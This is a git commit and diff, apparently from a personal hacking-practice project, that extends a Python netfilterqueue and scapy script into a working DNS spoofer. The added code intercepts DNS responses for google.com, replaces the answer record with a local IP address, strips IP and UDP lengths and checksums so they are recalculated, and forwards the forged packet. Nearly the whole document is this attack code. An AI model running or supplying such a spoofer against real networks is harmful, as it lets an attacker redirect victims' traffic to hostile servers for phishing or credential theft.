a382c7c486ed8896e16ec55b901482b095c40a63
Andreas W <31095453+Sir-Casm@users.noreply.github.com>
2022-08-23 15:35:20 +0200

    added spoofing to forward to a local server
    + added spoofing to forward google.com to a local server
       + filtering for google.com in DNS Question Record
       + changing the DNS Response Record to use an IP address of a local servers 
       + setting the values in the DNS layer to reflect the changes
       + deleting length and checksum fields from the IP and UDP layers to be automatically recalculated by scapy
       + overwriting the original response packet with the spoofed one

--- dns_spoofer.py
+++ dns_spoofer.py
@@ -2,11 +2,26 @@
 
 import netfilterqueue
 import scapy.layers.inet as inet
+import scapy.layers.dns as dns
 
 
 def process_packet(packet):
     scapy_packet = inet.IP(packet.get_payload())
-    print(scapy_packet.show())
+    if scapy_packet.haslayer(dns.DNSRR):
+        qname = scapy_packet[dns.DNSQR].qname
+        if "google.com" in qname.decode():
+            print("Spoofing target.")
+            answer = dns.DNSRR(rrname=qname, rdata="192.168.190.128")
+            scapy_packet[dns.DNS].an = answer
+            scapy_packet[dns.DNS].ancount = 1
+
+            del scapy_packet[inet.IP].len
+            del scapy_packet[inet.IP].chksum
+            del scapy_packet[inet.UDP].len
+            del scapy_packet[inet.UDP].chksum
+
+            packet.set_payload(str(scapy_packet))
+
     packet.accept()
 
 
@@ -17,4 +32,3 @@ try:
         queue.run()
 except KeyboardInterrupt:
     print("\nExiting script.\n")
-
